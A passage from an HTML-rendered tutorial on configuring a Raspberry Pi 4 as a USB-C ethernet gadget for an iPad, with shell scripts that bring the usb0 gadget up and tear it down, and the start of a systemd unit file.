style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/local/sbin/usb0up.sh:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;modprobe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; libcomposite&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /sys/kernel/config/usb_gadget&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; !&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pi4 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tmkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pi4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tcd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pi4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x1d6b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; idVendor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;  # Linux Foundation&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x0104&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; idProduct&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Multifunction Composite Gadget&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x0100&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bcdDevice&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # v1.0.0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x0200&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bcdUSB&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;    # USB2&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0xef&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;   &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bDeviceClass&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x02&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;   &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bDeviceSubClass&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0x01&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;   &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bDeviceProtocol&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tmkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; strings/0x409&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;  fedcba9876543211&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; strings/0x409/serialnumber&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Kali Linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;      &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; strings/0x409/manufacturer&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Kali Linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;      &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; strings/0x409/product&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tmkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/strings/0x409&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Config 1: ECM network&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/strings/0x409/configuration&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;  250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;                    &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/MaxPower&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tmkdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; functions/ecm.usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;00:dc:c8:f7:75:14&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; functions/ecm.usb0/host_addr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # HostPC&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;00:dd:dc:eb:6d:a1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; functions/ecm.usb0/dev_addr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;  # BadUSB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; functions/ecm.usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/ecm.usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tudevadm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; settle&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 5&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; ||&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; :&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /sys/class/udc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; UDC&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/local/sbin/usb0down.sh:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /sys/kernel/config/usb_gadget&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pi4 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tcd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pi4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; UDC&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/ecm.usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; functions/ecm.usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1/strings/0x409&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configs/c.1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; strings/0x409&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tcd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ..&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pi4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tcd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb_f_ecm&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; u_ether&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trmmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; libcomposite&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The usb0down.sh script is something you won’t find in &lt;a href=&quot;https://www.hardill.me.uk/wordpress/2019/11/02/pi4-usb-c-gadget/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;other tutorials&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; about setting up a Raspberry Pi in USB gadget mode. Those all focus on bringing the usb0 interface up — none cover how to tear it down successfully. Unfortunately, iPadOS 15 doesn’t like it when USB ethernet gadget goes partially down when exiting the initramfs (we’ll cover this part of things in the next section). To work around this, we need to have the ability to &lt;a href=&quot;https://e2e.ti.com/support/processors-group/processors/f/processors-forum/627474/linux-am3352-dynamic-reconfiguration-of-usb-gadget&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;completely remove usb0 so that the device doesn’t exist at all when the initramfs terminates and normal userland takes over&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Now that we can bring usb0 &lt;em&gt;completely&lt;/em&gt; up and down, let’s tie things together. Create the systemd service file /etc/systemd/system/usb0.service:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Unit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Raspberry Pi USB C ethernet gadget mode&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Before&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;network.target NetworkManager.service dnsmasq.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Requires&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;systemd-modules-load.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;WantedBy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sysinit.target&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Service&lt;/span&gt;&lt;span 